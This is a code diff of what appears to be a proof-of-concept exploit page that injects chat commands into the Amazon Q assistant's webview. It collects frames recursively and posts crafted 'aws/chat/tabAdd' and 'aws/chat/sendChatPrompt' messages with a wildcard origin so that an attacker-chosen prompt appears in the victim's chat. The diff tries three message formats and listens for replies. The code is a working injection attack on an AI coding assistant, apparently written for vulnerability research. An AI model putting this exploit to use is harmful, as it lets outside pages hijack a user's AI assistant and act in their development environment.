@@ -34,8 +34,17 @@ document.addEventListener('click', function(e) {
   if (!launched) { launched = true; exploit(); }
 });
 
+// Listen for any responses from the target window
+window.addEventListener('message', function(e) {
+  status('← Response: ' + JSON.stringify(e.data), 'warn');
+});
+
 function status(msg, cls) {
   document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
+}
+
+function shortId() {
+  return Math.random().toString(36).substring(2, 8);
 }
 
 function collectFrames(win, depth, max) {
@@ -52,50 +61,63 @@ function collectFrames(win, depth, max) {
   return results;
 }
 
+function sendToAll(targets, msg) {
+  targets.forEach(function(t) {
+    try { t.postMessage(msg, '*'); } catch(e) {}
+  });
+}
+
 function firePayloads(w) {
   var targets = collectFrames(w, 0, 5);
   status('Found ' + targets.length + ' target(s) (recursive). Sending payload...', 'ok');
 
   var prompt = 'Hello, what can you help me with?';
-  var tabId = crypto.randomUUID();
+  var tabId = shortId();
 
-  var tabAddMsg = {
-    command: 'aws/chat/tabAdd',
-    params: { tabId: tabId, restoredTab: false }
-  };
+  // Step 1: Create tab — matches known working format exactly
+  var tabAddMsg = { command: 'aws/chat/tabAdd', params: { tabId: tabId, restoredTab: false } };
+  sendToAll(targets, tabAddMsg);
+  status('→ tabAdd (tabId=' + tabId + ') sent to ' + targets.length + ' frame(s)', 'ok');
 
-  // Step 1: Create a new chat tab — send to every frame
-  targets.forEach(function(t) {
-    try { t.postMessage(tabAddMsg, '*'); } catch(e) {}
-  });
-  status('Sent tabAdd (tabId=' + tabId + ') to ' + targets.length + ' frame(s)', 'ok');
-
-  // Step 2: Send prompt after short delay for tab init
+  // Step 2: Send prompt — try multiple tabId placements after delay
   setTimeout(function() {
-    var chatMsg = {
+    // Format A: tabId inside params (current)
+    var msgA = {
       command: 'aws/chat/sendChatPrompt',
       params: {
         tabId: tabId,
-        prompt: { prompt: prompt, escapedPrompt: prompt },
-        cursorState: [{ position: { line: 0, character: 0 } }]
+        prompt: { prompt: prompt, escapedPrompt: prompt }
       }
     };
-    targets.forEach(function(t) {
-      try { t.postMessage(chatMsg, '*'); } catch(e) {}
-    });
-    status('Sent sendChatPrompt to ' + targets.length + ' frame(s): "' + prompt + '"', 'ok');
 
-    // Step 3: Also try with type-wrapped format (some webview bridges expect this)
-    var wrappedTabAdd = { type: 'message', command: tabAddMsg.command, params: tabAddMsg.params };
-    var wrappedChat = { type: 'message', command: chatMsg.command, params: chatMsg.params };
-    targets.forEach(function(t) {
-      try { t.postMessage(wrappedTabAdd, '*'); } catch(e) {}
-      try { t.postMessage(wrappedChat, '*'); } catch(e) {}
-    });
-    status('Also sent type:message wrapped variants.', 'ok');
+    // Format B: tabId at top level alongside command
+    var msgB = {
+      command: 'aws/chat/sendChatPrompt',
+      tabId: tabId,
+      params: {
+        prompt: { prompt: prompt, escapedPrompt: prompt }
+      }
+    };
 
-    status('Check Amazon Q chat panel — attacker prompt should appear.', 'warn');
-  }, 1000);
+    // Format C: tabId at both levels
+    var msgC = {
+      command: 'aws/chat/sendChatPrompt',
+      tabId: tabId,
+      params: {
+        tabId: tabId,
+        prompt: { prompt: prompt, escapedPrompt: prompt }
+      }
+    };
+
+    sendToAll(targets, msgA);
+    status('→ sendChatPrompt format A (tabId in params)', 'ok');
+    sendToAll(targets, msgB);
+    status('→ sendChatPrompt format B (tabId top-level)', 'ok');
+    sendToAll(targets, msgC);
+    status('→ sendChatPrompt format C (tabId both levels)', 'ok');
+
+    status('Watching for responses below...', 'warn');
+  }, 2000);
 }
 
 function exploit() {
